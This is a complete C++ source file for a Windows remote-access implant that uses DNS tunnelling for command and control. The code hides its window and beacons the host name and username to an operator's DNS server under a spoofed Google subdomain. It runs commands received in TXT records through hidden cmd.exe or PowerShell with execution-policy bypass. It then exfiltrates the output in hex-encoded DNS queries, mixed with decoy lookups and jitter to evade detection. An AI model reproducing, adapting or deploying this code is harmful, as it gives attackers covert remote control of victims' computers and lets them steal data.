#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <cstring>
#include <sstream>
#include <cstdio>
#include <cstdint>
#include <ctime>
#include <cstdlib>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#ifndef S_OK
#define S_OK 0L
#endif

#define DNS_PORT 53
#define BEACON_INTERVAL 5000  // Poll every 5 seconds
#define MAX_SUBDOMAIN_LENGTH 63
#define MAX_DOMAIN_LENGTH 253
#define JITTER_MS 2000  // Random jitter up to 2 seconds

// DNS server config, insert your own DNS server here
const char* DNS_SERVER = "<YOUR DNS SERVER HERE>";
const char* BASE_DOMAIN = "dns2.google.com"; //spoofed domain here i used dns2.google.com because it is a public dns server and it is easy to spoof.

// Legitimate domains for decoy queries (to blend in), insert your own domains here
const char* DECOY_DOMAINS[] = {
    "www.google.com",
    "www.microsoft.com",
    "www.amazon.com",
    "www.facebook.com",
    "api.weather.com",
    "cdn.cloudflare.com",
    "github.com",
    "stackoverflow.com",
    "www.reddit.com",
    "update.microsoft.com",
    "ocsp.digicert.com",
    "safebrowsing.googleapis.com",
    "clients4.google.com",
    "www.bing.com",
    "fonts.googleapis.com"
};
const int DECOY_COUNT = sizeof(DECOY_DOMAINS) / sizeof(DECOY_DOMAINS[0]);

// Structure for the DNS header
#pragma pack(push, 1)
struct DNSHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t q_count;
    uint16_t ans_count;
    uint16_t auth_count;
    uint16_t add_count;
};
#pragma pack(pop)

// Function to convert string to hex
std::string string_to_hex(const std::string& input) {
    static const char hex_chars[] = "0123456789abcdef";
    std::string output;
    for (unsigned char c : input) {
        output.push_back(hex_chars[c >> 4]);
        output.push_back(hex_chars[c & 0x0F]);
    }
    return output;
}

// Function to convert hex to string
std::string hex_to_string(const std::string& input) {
    std::string output;
    for (size_t i = 0; i < input.length(); i += 2) {
        std::string byte = input.substr(i, 2);
        char chr = (char)strtol(byte.c_str(), nullptr, 16);
        output.push_back(chr);
    }
    return output;
}

// Function to get computer name
std::string get_computer_name() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "UNKNOWN";
}

// Function to get current username
std::string get_username() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "UNKNOWN";
}

// Function to encode a domain name in DNS format
std::vector<uint8_t> encode_dns_name(const std::string& domain) {
    std::vector<uint8_t> encoded;
    size_t start = 0, end;

    while ((end = domain.find('.', start)) != std::string::npos) {
        encoded.push_back(static_cast<uint8_t>(end - start));
        encoded.insert(encoded.end(), domain.begin() + start, domain.begin() + end);
        start = end + 1;
    }
    encoded.push_back(static_cast<uint8_t>(domain.size() - start));
    encoded.insert(encoded.end(), domain.begin() + start, domain.end());
    encoded.push_back(0);
    return encoded;
}

// Function to parse DNS response and extract TXT data
std::string parse_dns_response(const std::vector<uint8_t>& response) {
    if (response.size() < sizeof(DNSHeader)) {
        return "";
    }

    DNSHeader* header = (DNSHeader*)response.data();
    uint16_t ans_count = ntohs(header->ans_count);
    
    if (ans_count == 0) {
        return "";
    }

    // Skip to answer section (after header and questions)
    size_t offset = sizeof(DNSHeader);
    
    // Skip question section
    uint16_t q_count = ntohs(header->q_count);
    for (int i = 0; i < q_count; i++) {
        while (offset < response.size() && response[offset] != 0) {
            offset += response[offset] + 1;
        }
        offset += 5; // null terminator + qtype + qclass
    }

    // Parse answer section for TXT records
    std::string result;
    for (int i = 0; i < ans_count && offset < response.size(); i++) {
        // Skip name (could be pointer or label)
        if ((response[offset] & 0xC0) == 0xC0) {
            offset += 2; // Pointer
        } else {
            while (offset < response.size() && response[offset] != 0) {
                offset += response[offset] + 1;
            }
            offset++;
        }

        if (offset + 10 > response.size()) break;

        uint16_t type = (response[offset] << 8) | response[offset + 1];
        uint16_t rdlength = (response[offset + 8] << 8) | response[offset + 9];
        offset += 10;

        if (type == 16 && offset + rdlength <= response.size()) { // TXT record
            size_t txt_offset = offset;
            while (txt_offset < offset + rdlength) {
                uint8_t txt_len = response[txt_offset++];
                if (txt_offset + txt_len <= offset + rdlength) {
                    result.append((char*)&response[txt_offset], txt_len);
                    txt_offset += txt_len;
                }
            }
        }
        offset += rdlength;
    }

    return result;
}

// Function to send decoy DNS query (to public DNS servers)
void send_decoy_query(const std::string& domain) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in dns_server;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Set short timeout for decoy queries
    DWORD timeout = 1000; // 1 second
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    // Use public DNS servers randomly (Google, Cloudflare, OpenDNS)
    const char* public_dns[] = {"8.8.8.8", "1.1.1.1", "208.67.222.222"};
    dns_server.sin_family = AF_INET;
    dns_server.sin_port = htons(DNS_PORT);
    dns_server.sin_addr.s_addr = inet_addr(public_dns[rand() % 3]);

    // Build DNS packet
    std::vector<uint8_t> dns_packet(sizeof(DNSHeader));
    DNSHeader* dns = reinterpret_cast<DNSHeader*>(&dns_packet[0]);
    dns->id = htons(rand() % 65535);
    dns->flags = htons(0x0100);
    dns->q_count = htons(1);
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;

    std::vector<uint8_t> encoded_name = encode_dns_name(domain);
    dns_packet.insert(dns_packet.end(), encoded_name.begin(), encoded_name.end());

    uint16_t qtype_net = htons(1); // A record
    uint16_t qclass_net = htons(1);
    dns_packet.insert(dns_packet.end(), reinterpret_cast<uint8_t*>(&qtype_net), 
                      reinterpret_cast<uint8_t*>(&qtype_net) + sizeof(qtype_net));
    dns_packet.insert(dns_packet.end(), reinterpret_cast<uint8_t*>(&qclass_net), 
                      reinterpret_cast<uint8_t*>(&qclass_net) + sizeof(qclass_net));

    sendto(sock, reinterpret_cast<char*>(dns_packet.data()), dns_packet.size(), 0,
           (struct sockaddr*)&dns_server, sizeof(dns_server));

    closesocket(sock);
    WSACleanup();
}

// Function to send DNS query and get response
std::string send_dns_query(const std::string& domain, uint16_t qtype = 16) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return "";
    }

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return "";
    }

    // Set timeout
    DWORD timeout = 3000; // 3 seconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_PORT);
    server_addr.sin_addr.s_addr = inet_addr(DNS_SERVER);

    // Build DNS packet
    std::vector<uint8_t> dns_packet(sizeof(DNSHeader));
    DNSHeader* dns = reinterpret_cast<DNSHeader*>(&dns_packet[0]);
    dns->id = htons(rand() % 65535);
    dns->flags = htons(0x0100); // My Fucking Standard query
    dns->q_count = htons(1);
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;

    std::vector<uint8_t> encoded_name = encode_dns_name(domain);
    dns_packet.insert(dns_packet.end(), encoded_name.begin(), encoded_name.end());

    uint16_t qtype_net = htons(qtype);
    uint16_t qclass_net = htons(1);
    dns_packet.insert(dns_packet.end(), reinterpret_cast<uint8_t*>(&qtype_net), 
                      reinterpret_cast<uint8_t*>(&qtype_net) + sizeof(qtype_net));
    dns_packet.insert(dns_packet.end(), reinterpret_cast<uint8_t*>(&qclass_net), 
                      reinterpret_cast<uint8_t*>(&qclass_net) + sizeof(qclass_net));

    sendto(sock, reinterpret_cast<char*>(dns_packet.data()), dns_packet.size(), 0,
           (struct sockaddr*)&server_addr, sizeof(server_addr));

    // Receive response
    std::vector<uint8_t> response(512);
    int recv_len = recvfrom(sock, reinterpret_cast<char*>(response.data()), 512, 0, nullptr, nullptr);
    
    closesocket(sock);
    WSACleanup();

    if (recv_len > 0) {
        response.resize(recv_len);
        return parse_dns_response(response);
    }

    return "";
}

// Function to execute command and get output (COMPLETELY HIDDEN - NO WINDOW)
std::string execute_command(const std::string& cmd) {
    std::string result;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    
    // Create pipe for output
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Error: Failed to create pipe";
    }
    
    // Make read handle uninheritable
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    // Setup process info
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    // Build command: cmd.exe /c "command"
    std::string full_cmd = "cmd.exe /c " + cmd;
    
    // Create process (HIDDEN - NO WINDOW AT ALL)
    if (CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, TRUE, 
                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
                       NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        
        // Read output
        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            result += buffer;
        }
        
        // Wait for process
        WaitForSingleObject(pi.hProcess, 30000); // 30 second timeout
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        result = "Error: Failed to execute command";
    }
    
    CloseHandle(hReadPipe);
    
    if (result.empty()) {
        result = "Command executed (no output)";
    }
    
    return result;
}

// Function to execute PowerShell command and get output (COMPLETELY HIDDEN - NO WINDOW)
std::string execute_powershell(const std::string& cmd) {
    std::string result;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    
    // Create pipe for output
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Error: Failed to create pipe";
    }
    
    // Make read handle uninheritable
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    // Setup process info
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    // Build PowerShell command with proper encoding and stealth flags
    std::stringstream ps_cmd;
    ps_cmd << "powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive "
           << "-WindowStyle Hidden -NoLogo -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; ";
    ps_cmd << cmd;
    ps_cmd << "\"";
    
    std::string full_cmd = ps_cmd.str();
    
    // Create process (HIDDEN - NO WINDOW AT ALL)
    if (CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, TRUE, 
                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
                       NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        
        // Read output
        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            result += buffer;
        }
        
        // Wait for process
        WaitForSingleObject(pi.hProcess, 60000); // 60 second timeout for PowerShell
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        result = "Error: Failed to execute PowerShell command";
    }
    
    CloseHandle(hReadPipe);
    
    if (result.empty()) {
        result = "PowerShell command executed (no output)";
    }
    
    return result;
}

// Function to exfiltrate data via DNS (chunked) with decoy traffic - FAST
void exfiltrate_data(const std::string& data, const std::string& session_id) {
    std::string hex_data = string_to_hex(data);
    size_t chunk_size = 50; // Max subdomain chunk size
    size_t total_chunks = (hex_data.length() + chunk_size - 1) / chunk_size;

    for (size_t i = 0; i < total_chunks; i++) {
        // Send 1 decoy query before C2 data
        send_decoy_query(DECOY_DOMAINS[rand() % DECOY_COUNT]);
        Sleep(20 + rand() % 30);  // Reduced from 50-150ms to 20-50ms
        
        // Send actual C2 data
        std::string chunk = hex_data.substr(i * chunk_size, chunk_size);
        std::stringstream domain;
        domain << "data." << session_id << "." << i << "." << total_chunks << "." << chunk << "." << BASE_DOMAIN;
        send_dns_query(domain.str(), 1); // A record query
        Sleep(30 + rand() % 50);  // Reduced from 100-300ms to 30-80ms
        
        // Send 1 decoy query after C2 data
        send_decoy_query(DECOY_DOMAINS[rand() % DECOY_COUNT]);
        Sleep(20 + rand() % 30);  // Reduced from 50-150ms to 20-50ms
    }
}

// Main beacon loop
void beacon_loop() {
    std::string session_id = std::to_string(rand() % 100000);
    std::string computer_name = get_computer_name();
    std::string username = get_username();

    while (true) {
        try {
            // Send 2 decoy queries before beacon (blend in) - FASTER
            int decoy_count = rand() % 2 + 1;
            for (int i = 0; i < decoy_count; i++) {
                send_decoy_query(DECOY_DOMAINS[rand() % DECOY_COUNT]);
                Sleep(50 + rand() % 100);  // Reduced from 100-400ms to 50-150ms
            }
            
            // Send beacon query with computer name and username
            std::stringstream beacon_domain;
            beacon_domain << "beacon." << session_id << "." << computer_name << "." << username << "." << BASE_DOMAIN;
            
            std::string response = send_dns_query(beacon_domain.str());
            
            // Send 1 decoy query after beacon
            decoy_count = rand() % 2;
            for (int i = 0; i < decoy_count; i++) {
                Sleep(50 + rand() % 100);  // Reduced from 100-300ms to 50-150ms
                send_decoy_query(DECOY_DOMAINS[rand() % DECOY_COUNT]);
            }

            if (!response.empty() && response != "IDLE" && response != "idle") {
                std::string output;
                
                // Check if this is a PowerShell command
                if (response.substr(0, 3) == "ps:" || response.substr(0, 11) == "powershell:") {
                    // Extract the PowerShell command
                    size_t prefix_len = (response.substr(0, 3) == "ps:") ? 3 : 11;
                    std::string ps_cmd = response.substr(prefix_len);
                    output = execute_powershell(ps_cmd);
                } else {
                    // Execute as regular CMD command
                    output = execute_command(response);
                }

                // Exfiltrate output (already includes decoy traffic)
                exfiltrate_data(output, session_id);
            }
        }
        catch (...) {
            // Silent failure, continue beaconing
        }

        // Add random jitter to avoid pattern detection
        int jitter = rand() % JITTER_MS;
        Sleep(BEACON_INTERVAL + jitter);
    }
}

// WinMain entry point for GUI subsystem
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand(time(nullptr));
    
    // Ensure complete stealth
    FreeConsole();  // Detach from any console
    
    beacon_loop();
    return 0;
}

// Standard main() as fallback
int main() {
    srand(time(nullptr));
    
    // Hide console window completely
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
        SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
    }
    FreeConsole();
    
    beacon_loop();
    return 0;
}
